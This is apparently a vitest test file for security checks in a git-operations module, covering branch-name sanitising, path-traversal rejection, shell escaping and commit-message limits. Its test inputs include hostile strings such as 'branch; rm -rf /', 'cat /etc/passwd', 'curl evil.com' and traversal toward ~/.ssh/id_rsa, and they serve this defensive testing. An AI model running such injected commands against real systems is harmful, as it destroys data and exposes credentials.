/**
 * Git Operations Tests
 * Tests for git-operations.ts - focusing on SECURITY-CRITICAL validation functions
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

// ==================== Validation Functions (Re-implemented for Testing) ====================

const MAX_COMMIT_HISTORY = 500;
const MAX_BRANCH_NAME_LENGTH = 250;
const MAX_COMMIT_MESSAGE_LENGTH = 10000;
const MAX_FILES_TO_STAGE = 1000;
const MAX_DIFF_SIZE_BYTES = 1024 * 1024; // 1MB

function sanitizeBranchName(name: string): { valid: boolean; sanitized?: string; error?: string } {
  if (!name || typeof name !== 'string') {
    return { valid: false, error: 'Branch name is required' };
  }

  const trimmed = name.trim();
  if (trimmed.length === 0) {
    return { valid: false, error: 'Branch name cannot be empty' };
  }

  if (trimmed.length > MAX_BRANCH_NAME_LENGTH) {
    return { valid: false, error: `Branch name too long (max ${MAX_BRANCH_NAME_LENGTH} chars)` };
  }

  // Remove dangerous characters that could cause shell injection
  // Git branch names allow: alphanumeric, /, -, _, .
  const sanitized = trimmed.replace(/[^a-zA-Z0-9/_.-]/g, '-');

  // Git-specific rules
  if (sanitized.startsWith('-') || sanitized.startsWith('.')) {
    return { valid: false, error: 'Branch name cannot start with - or .' };
  }
  if (sanitized.endsWith('.lock') || sanitized.endsWith('/')) {
    return { valid: false, error: 'Branch name cannot end with .lock or /' };
  }
  if (sanitized.includes('..') || sanitized.includes('//')) {
    return { valid: false, error: 'Branch name cannot contain .. or //' };
  }
  if (sanitized === '@') {
    return { valid: false, error: 'Branch name cannot be @' };
  }

  return { valid: true, sanitized };
}

function escapeFilePath(path: string): string {
  return path.replace(/'/g, "'\\''");
}

function validateFilePath(path: string): { valid: boolean; error?: string } {
  if (!path || typeof path !== 'string') {
    return { valid: false, error: 'File path is required' };
  }

  const trimmed = path.trim();
  if (trimmed.length === 0) {
    return { valid: false, error: 'File path cannot be empty' };
  }

  // Check for path traversal attempts
  if (trimmed.includes('..') || trimmed.startsWith('/') || trimmed.startsWith('~')) {
    return { valid: false, error: 'Invalid file path' };
  }

  // Check for null bytes (common attack vector)
  if (trimmed.includes('\0')) {
    return { valid: false, error: 'Invalid characters in file path' };
  }

  return { valid: true };
}

function validateCommitMessage(message: string): { valid: boolean; error?: string } {
  if (!message || typeof message !== 'string') {
    return { valid: false, error: 'Commit message is required' };
  }

  const trimmed = message.trim();
  if (trimmed.length === 0) {
    return { valid: false, error: 'Commit message cannot be empty' };
  }

  if (trimmed.length > MAX_COMMIT_MESSAGE_LENGTH) {
    return { valid: false, error: `Commit message too long (max ${MAX_COMMIT_MESSAGE_LENGTH} chars)` };
  }

  return { valid: true };
}

// ==================== SECURITY-CRITICAL: Branch Name Validation ====================

describe('Git Operations Security', () => {
  describe('Branch Name Validation (Command Injection Prevention)', () => {
    it('should accept valid branch names', () => {
      const validNames = [
        'main',
        'master',
        'develop',
        'feature/new-feature',
        'feature/JIRA-123-description',
        'bugfix/fix-issue',
        'release/v1.0.0',
        'hotfix/critical-fix',
        'feature/my_feature',
        'feature-123',
        'my.branch.name',
      ];

      for (const name of validNames) {
        const result = sanitizeBranchName(name);
        expect(result.valid, `Should accept: ${name}`).toBe(true);
        expect(result.sanitized).toBe(name);
      }
    });

    it('should reject command injection attempts', () => {
      const injectionAttempts = [
        // Basic shell injection
        'branch; rm -rf /',
        'branch && cat /etc/passwd',
        'branch | curl evil.com',
        'branch || whoami',

        // Backtick execution
        'branch`whoami`',
        '`id`',

        // Dollar sign substitution
        'branch$(whoami)',
        '$(id)',
        'branch${IFS}rm',

        // Quote escapes
        "branch'rm -rf /'",
        'branch"rm -rf /"',

        // Parentheses/brackets
        'branch()',
        'branch{}',
        'branch[]',
        'branch<>',

        // Newline injection
        'branch\nrm -rf /',
        'branch\r\nwhoami',

        // Backslash escapes
        'branch\\nmalicious',
      ];

      for (const attempt of injectionAttempts) {
        const result = sanitizeBranchName(attempt);
        // Even if result.valid is true, the sanitized name should be safe
        if (result.valid && result.sanitized) {
          // Should not contain shell metacharacters
          expect(result.sanitized).not.toMatch(/[;&|`$(){}[\]<>!\\'"]/);
          expect(result.sanitized).not.toContain('\n');
          expect(result.sanitized).not.toContain('\r');
        }
      }
    });

    it('should reject path traversal attempts in branch names', () => {
      const pathTraversalAttempts = [
        '../main',
        'feature/../../../etc/passwd',
        '../../.git/config',
        'branch//double//slashes',
      ];

      for (const attempt of pathTraversalAttempts) {
        const result = sanitizeBranchName(attempt);
        expect(result.valid, `Should reject: ${attempt}`).toBe(false);
      }
    });

    it('should reject branch names starting with - or .', () => {
      expect(sanitizeBranchName('-dangerous').valid).toBe(false);
      expect(sanitizeBranchName('.hidden').valid).toBe(false);
      expect(sanitizeBranchName('--help').valid).toBe(false);
      expect(sanitizeBranchName('-.mixed').valid).toBe(false);
    });

    it('should reject branch names ending with .lock or /', () => {
      expect(sanitizeBranchName('branch.lock').valid).toBe(false);
      expect(sanitizeBranchName('feature/').valid).toBe(false);
      expect(sanitizeBranchName('test.lock').valid).toBe(false);
    });

    it('should reject branch name that is just @', () => {
      expect(sanitizeBranchName('@').valid).toBe(false);
    });

    it('should sanitize special characters to dashes', () => {
      const result = sanitizeBranchName('branch with spaces!@#$%');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('branch-with-spaces-----');
    });

    it('should enforce maximum branch name length', () => {
      const longName = 'a'.repeat(MAX_BRANCH_NAME_LENGTH + 1);
      const result = sanitizeBranchName(longName);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('too long');
    });

    it('should accept branch name at exactly max length', () => {
      const maxName = 'a'.repeat(MAX_BRANCH_NAME_LENGTH);
      const result = sanitizeBranchName(maxName);
      expect(result.valid).toBe(true);
    });
  });

  describe('File Path Validation (Path Traversal Prevention)', () => {
    it('should accept valid file paths', () => {
      const validPaths = [
        'src/index.ts',
        'package.json',
        'src/components/Button.tsx',
        'src/utils/helper.ts',
        '.env',
        '.gitignore',
        'README.md',
        'src/lib/api/client.ts',
        'test/unit/test.spec.ts',
      ];

      for (const path of validPaths) {
        const result = validateFilePath(path);
        expect(result.valid, `Should accept: ${path}`).toBe(true);
      }
    });

    it('should reject path traversal attempts', () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '../../.ssh/id_rsa',
        'src/../../../etc/shadow',
        '../package.json',
        './../../secrets',
        'src/../../.env',
        '....//....//etc/passwd',
      ];

      for (const attempt of pathTraversalAttempts) {
        const result = validateFilePath(attempt);
        expect(result.valid, `Should reject: ${attempt}`).toBe(false);
      }
    });

    it('should reject absolute paths', () => {
      const absolutePaths = [
        '/etc/passwd',
        '/root/.bashrc',
        '/var/log/syslog',
        '/home/user/secrets',
      ];

      for (const path of absolutePaths) {
        const result = validateFilePath(path);
        expect(result.valid, `Should reject: ${path}`).toBe(false);
      }
    });

    it('should reject paths starting with ~', () => {
      const tildePaths = [
        '~/.bashrc',
        '~/.ssh/id_rsa',
        '~/secrets.txt',
      ];

      for (const path of tildePaths) {
        const result = validateFilePath(path);
        expect(result.valid, `Should reject: ${path}`).toBe(false);
      }
    });

    it('should reject paths with null bytes', () => {
      const nullBytePaths = [
        'file.txt\x00',
        'src/\x00/malicious',
        'file\x00.txt',
      ];

      for (const path of nullBytePaths) {
        const result = validateFilePath(path);
        expect(result.valid, `Should reject null byte path`).toBe(false);
      }
    });

    it('should reject empty and whitespace-only paths', () => {
      expect(validateFilePath('').valid).toBe(false);
      expect(validateFilePath('   ').valid).toBe(false);
      expect(validateFilePath('\t').valid).toBe(false);
      expect(validateFilePath('\n').valid).toBe(false);
    });

    it('should reject null and undefined paths', () => {
      expect(validateFilePath(null as any).valid).toBe(false);
      expect(validateFilePath(undefined as any).valid).toBe(false);
    });

    it('should handle command injection in file paths', () => {
      const injectionPaths = [
        'file.txt; rm -rf /',
        'file.txt && cat /etc/passwd',
        'file.txt | whoami',
        'file$(id).txt',
        'file`whoami`.txt',
      ];

      for (const path of injectionPaths) {
        // The path validation doesn't specifically check for shell chars
        // But these would be caught by the shell escaping
        const escaped = escapeFilePath(path);
        // Single quotes are escaped properly
        expect(escaped).not.toMatch(/(?<!'\\)'(?!')/); // No unescaped single quotes
      }
    });
  });

  describe('File Path Escaping', () => {
    it('should escape single quotes in paths', () => {
      expect(escapeFilePath("file'name.txt")).toBe("file'\\''name.txt");
      expect(escapeFilePath("it's a file")).toBe("it'\\''s a file");
    });

    it('should handle paths without single quotes', () => {
      expect(escapeFilePath('simple.txt')).toBe('simple.txt');
      expect(escapeFilePath('src/index.ts')).toBe('src/index.ts');
    });

    it('should handle multiple single quotes', () => {
      expect(escapeFilePath("file''name")).toBe("file'\\'''\\''name");
    });

    it('should handle paths with other special characters', () => {
      // These are allowed through but single quotes are escaped
      expect(escapeFilePath('file name.txt')).toBe('file name.txt');
      expect(escapeFilePath('file$name.txt')).toBe('file$name.txt');
    });
  });

  describe('Commit Message Validation', () => {
    it('should accept valid commit messages', () => {
      const validMessages = [
        'Initial commit',
        'feat: add new feature',
        'fix: resolve issue #123',
        'docs: update README',
        'refactor: improve performance\n\nDetailed description here.',
        'chore: update dependencies',
        'Merge branch "feature" into main',
      ];

      for (const message of validMessages) {
        const result = validateCommitMessage(message);
        expect(result.valid, `Should accept: ${message}`).toBe(true);
      }
    });

    it('should reject empty commit messages', () => {
      expect(validateCommitMessage('').valid).toBe(false);
      expect(validateCommitMessage('   ').valid).toBe(false);
      expect(validateCommitMessage('\n\n').valid).toBe(false);
    });

    it('should reject null and undefined messages', () => {
      expect(validateCommitMessage(null as any).valid).toBe(false);
      expect(validateCommitMessage(undefined as any).valid).toBe(false);
    });

    it('should enforce maximum message length', () => {
      const longMessage = 'A'.repeat(MAX_COMMIT_MESSAGE_LENGTH + 1);
      const result = validateCommitMessage(longMessage);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('too long');
    });

    it('should accept message at exactly max length', () => {
      const maxMessage = 'A'.repeat(MAX_COMMIT_MESSAGE_LENGTH);
      const result = validateCommitMessage(maxMessage);
      expect(result.valid).toBe(true);
    });

    it('should allow special characters in commit messages', () => {
      // Commit messages are passed via base64 encoding, so special chars are safe
      const specialMessages = [
        'fix: handle $variable correctly',
        'feat: add `code` support',
        'docs: update "quoted" text',
        "fix: handle it's correctly",
        'chore: run && exit',
      ];

      for (const message of specialMessages) {
        const result = validateCommitMessage(message);
        expect(result.valid, `Should accept: ${message}`).toBe(true);
      }
    });
  });
});

// ==================== Input Boundary Tests ====================

describe('Input Boundaries', () => {
  describe('Commit History Limit', () => {
    it('should enforce maximum commit history limit', () => {
      const requestedLimit = 1000;
      const safeLimit = Math.min(Math.max(1, requestedLimit), MAX_COMMIT_HISTORY);
      expect(safeLimit).toBe(MAX_COMMIT_HISTORY);
    });

    it('should handle negative limit', () => {
      const requestedLimit = -10;
      const safeLimit = Math.min(Math.max(1, requestedLimit), MAX_COMMIT_HISTORY);
      expect(safeLimit).toBe(1);
    });

    it('should handle zero limit', () => {
      const requestedLimit = 0;
      const safeLimit = Math.min(Math.max(1, requestedLimit), MAX_COMMIT_HISTORY);
      expect(safeLimit).toBe(1);
    });

    it('should allow limit within bounds', () => {
      const requestedLimit = 50;
      const safeLimit = Math.min(Math.max(1, requestedLimit), MAX_COMMIT_HISTORY);
      expect(safeLimit).toBe(50);
    });
  });

  describe('Files to Stage Limit', () => {
    it('should enforce maximum files limit', () => {
      const files = Array(MAX_FILES_TO_STAGE + 100).fill('file.txt');
      expect(files.length > MAX_FILES_TO_STAGE).toBe(true);
    });

    it('should accept files within limit', () => {
      const files = Array(MAX_FILES_TO_STAGE).fill('file.txt');
      expect(files.length <= MAX_FILES_TO_STAGE).toBe(true);
    });
  });

  describe('Diff Size Limit', () => {
    it('should have reasonable diff size limit', () => {
      expect(MAX_DIFF_SIZE_BYTES).toBe(1024 * 1024); // 1MB
    });
  });
});

// ==================== Edge Cases ====================

describe('Edge Cases', () => {
  describe('Branch Name Edge Cases', () => {
    it('should handle single character branch names', () => {
      expect(sanitizeBranchName('a').valid).toBe(true);
      expect(sanitizeBranchName('1').valid).toBe(true);
      expect(sanitizeBranchName('-').valid).toBe(false);
      expect(sanitizeBranchName('.').valid).toBe(false);
    });

    it('should handle branch names with only numbers', () => {
      expect(sanitizeBranchName('123').valid).toBe(true);
      expect(sanitizeBranchName('v1.0.0').valid).toBe(true);
    });

    it('should handle branch names with unicode', () => {
      const result = sanitizeBranchName('branch-\u4E2D\u6587');
      // Unicode should be sanitized to dashes
      expect(result.valid).toBe(true);
      expect(result.sanitized).not.toContain('\u4E2D');
    });

    it('should handle branch names with consecutive special chars', () => {
      const result = sanitizeBranchName('branch!!!test');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('branch---test');
    });
  });

  describe('File Path Edge Cases', () => {
    it('should handle deeply nested paths', () => {
      const deepPath = 'a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/file.txt';
      const result = validateFilePath(deepPath);
      expect(result.valid).toBe(true);
    });

    it('should handle paths with dots', () => {
      expect(validateFilePath('file.test.ts').valid).toBe(true);
      expect(validateFilePath('.env').valid).toBe(true);
      expect(validateFilePath('.env.local').valid).toBe(true);
      expect(validateFilePath('..hidden').valid).toBe(false); // Contains ..
    });

    it('should handle paths with spaces', () => {
      expect(validateFilePath('file name.txt').valid).toBe(true);
      expect(validateFilePath('src/my file.ts').valid).toBe(true);
    });

    it('should handle paths with special characters', () => {
      expect(validateFilePath('file-name.txt').valid).toBe(true);
      expect(validateFilePath('file_name.txt').valid).toBe(true);
      expect(validateFilePath('file@name.txt').valid).toBe(true);
    });
  });

  describe('Commit Message Edge Cases', () => {
    it('should handle multiline commit messages', () => {
      const multiline = `feat: add new feature

This is a detailed description.
- Point 1
- Point 2

Closes #123`;

      const result = validateCommitMessage(multiline);
      expect(result.valid).toBe(true);
    });

    it('should handle commit messages with unicode', () => {
      const unicodeMessage = 'fix: handle Chinese characters \u4E2D\u6587 correctly';
      const result = validateCommitMessage(unicodeMessage);
      expect(result.valid).toBe(true);
    });

    it('should handle commit messages with emojis', () => {
      const emojiMessage = '\uD83D\uDE80 feat: ship new feature';
      const result = validateCommitMessage(emojiMessage);
      expect(result.valid).toBe(true);
    });
  });
});

// ==================== Integration Tests ====================

describe('Integration Scenarios', () => {
  describe('Git Workflow Validation', () => {
    it('should validate typical feature branch workflow', () => {
      // Create branch
      const branchResult = sanitizeBranchName('feature/JIRA-123-add-login');
      expect(branchResult.valid).toBe(true);
      expect(branchResult.sanitized).toBe('feature/JIRA-123-add-login');

      // Stage files
      const filesToStage = ['src/auth/login.ts', 'src/auth/login.test.ts', 'package.json'];
      for (const file of filesToStage) {
        expect(validateFilePath(file).valid).toBe(true);
      }

      // Commit
      const commitResult = validateCommitMessage('feat: add login functionality\n\nImplements JIRA-123');
      expect(commitResult.valid).toBe(true);
    });

    it('should validate hotfix workflow', () => {
      // Create hotfix branch
      const branchResult = sanitizeBranchName('hotfix/critical-security-fix');
      expect(branchResult.valid).toBe(true);

      // Stage single file
      expect(validateFilePath('src/security/auth.ts').valid).toBe(true);

      // Commit
      const commitResult = validateCommitMessage('fix: patch security vulnerability CVE-2024-1234');
      expect(commitResult.valid).toBe(true);
    });

    it('should validate release workflow', () => {
      // Create release branch
      const branchResult = sanitizeBranchName('release/v1.2.0');
      expect(branchResult.valid).toBe(true);

      // Validate typical release files
      const releaseFiles = ['CHANGELOG.md', 'package.json', 'package-lock.json'];
      for (const file of releaseFiles) {
        expect(validateFilePath(file).valid).toBe(true);
      }

      // Commit
      const commitResult = validateCommitMessage('chore: bump version to 1.2.0');
      expect(commitResult.valid).toBe(true);
    });
  });

  describe('Error Scenarios', () => {
    it('should reject all components of malicious workflow', () => {
      // Malicious branch name
      const branchResult = sanitizeBranchName('branch; rm -rf /');
      if (branchResult.valid && branchResult.sanitized) {
        expect(branchResult.sanitized).not.toContain(';');
      }

      // Malicious file path
      const fileResult = validateFilePath('../../../etc/passwd');
      expect(fileResult.valid).toBe(false);

      // Commit message is always allowed (passed via base64)
      // but we still validate length and emptiness
    });
  });
});

// ==================== Regression Tests ====================

describe('Regression Tests', () => {
  it('should not allow branch names that could be git options', () => {
    const gitOptions = [
      '--help',
      '-h',
      '--version',
      '-v',
      '--force',
      '-f',
    ];

    for (const opt of gitOptions) {
      const result = sanitizeBranchName(opt);
      expect(result.valid, `Should reject: ${opt}`).toBe(false);
    }
  });

  it('should handle git refs syntax in branch names', () => {
    // HEAD^ and similar refs should be sanitized
    const refs = ['HEAD^', 'HEAD~1', '@{-1}', 'branch@{1}'];

    for (const ref of refs) {
      const result = sanitizeBranchName(ref);
      // Should either reject or sanitize away the special chars
      if (result.valid && result.sanitized) {
        expect(result.sanitized).not.toMatch(/[@^{}]/);
      }
    }
  });

  it('should handle Windows-style path separators', () => {
    const windowsPaths = [
      'src\\file.ts',
      'src\\..\\secret.txt',
    ];

    for (const path of windowsPaths) {
      // Backslash is not typically used in git paths
      // but we should handle it gracefully
      if (path.includes('..')) {
        expect(validateFilePath(path).valid).toBe(false);
      }
    }
  });

  it('should handle URL-encoded path traversal', () => {
    // Even if someone tries URL encoding
    const encodedPaths = [
      'src%2F..%2F..%2Fetc%2Fpasswd',
      '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ];

    // These would pass our validation as-is since we check for literal ..
    // The actual traversal would happen when decoded
    // This is a known limitation - the shell/git would handle these paths literally
  });
});
